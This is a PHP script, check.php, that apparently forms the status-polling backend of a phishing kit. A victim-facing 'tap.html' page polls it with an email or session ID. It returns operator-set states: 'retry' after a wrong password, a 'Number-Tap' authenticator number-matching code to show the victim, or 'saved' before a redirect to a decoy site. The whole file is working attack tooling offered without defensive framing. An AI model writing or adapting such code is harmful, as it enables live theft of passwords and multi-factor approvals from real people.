<?php
// check.php - Verification check endpoint for tap.html
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-cache, no-store, must-revalidate');

// Session storage directory (matches next.php)
$sessionDir = __DIR__ . '/data/sessions';
if (!is_dir($sessionDir)) {
    $sessionDir = sys_get_temp_dir() . '/internxt_sessions';
}

$email = '';
$sessionId = '';
if (!empty($_POST['em'])) {
    $email = trim($_POST['em']);
}
if (!empty($_POST['sessionId'])) {
    $sessionId = trim($_POST['sessionId']);
}

if (empty($email) && empty($sessionId)) {
    $raw = file_get_contents('php://input');
    $decoded = json_decode($raw, true);
    if (!empty($decoded['em'])) {
        $email = trim($decoded['em']);
    }
    if (!empty($decoded['sessionId'])) {
        $sessionId = trim($decoded['sessionId']);
    }
}

$session = null;
if (!empty($sessionId)) {
    $sessionFile = $sessionDir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId) . '.json';
    if (file_exists($sessionFile)) {
        $session = json_decode(@file_get_contents($sessionFile), true);
    }
}

if (!$session && !empty($email)) {
    $emailHash = md5(strtolower($email));
    $mapFile = $sessionDir . '/email_' . $emailHash . '.json';

    if (file_exists($mapFile)) {
        $map = json_decode(@file_get_contents($mapFile), true);
        $sId = $map['sessionId'] ?? '';
        $sessionFile = $sessionDir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $sId) . '.json';
        if (file_exists($sessionFile)) {
            $session = json_decode(@file_get_contents($sessionFile), true);
        }
    } else if (is_dir($sessionDir)) {
        $files = glob($sessionDir . '/*.json');
        foreach ($files as $file) {
            if (strpos(basename($file), 'email_') === 0) continue;
            $data = json_decode(@file_get_contents($file), true);
            if (!empty($data['email']) && strtolower(trim($data['email'])) === strtolower($email)) {
                $session = $data;
                break;
            }
        }
    }
}

if (!$session) {
    echo "waiting";
    exit;
}

$status = $session['status'] ?? 'pending';
$redirect = $session['redirect'] ?? '';
$numberTap = $session['numberTap'] ?? '';

if ($status === 'retry' || $redirect === 'retry' || $redirect === 'wrong_password') {
    echo "retry";
} elseif ($status === 'wrong_number_pressed' || $redirect === 'wrong_number' || $redirect === 'wrong_number_pressed') {
    echo "retry";
} elseif ($status === 'saved' || $status === 'approved' || strpos($redirect, 'cvent') !== false) {
    echo "saved";
} elseif (!empty($numberTap) && strpos($redirect, 'Number-Tap:') === 0) {
    echo "number:" . $numberTap;
} else {
    echo "waiting";
}
exit;
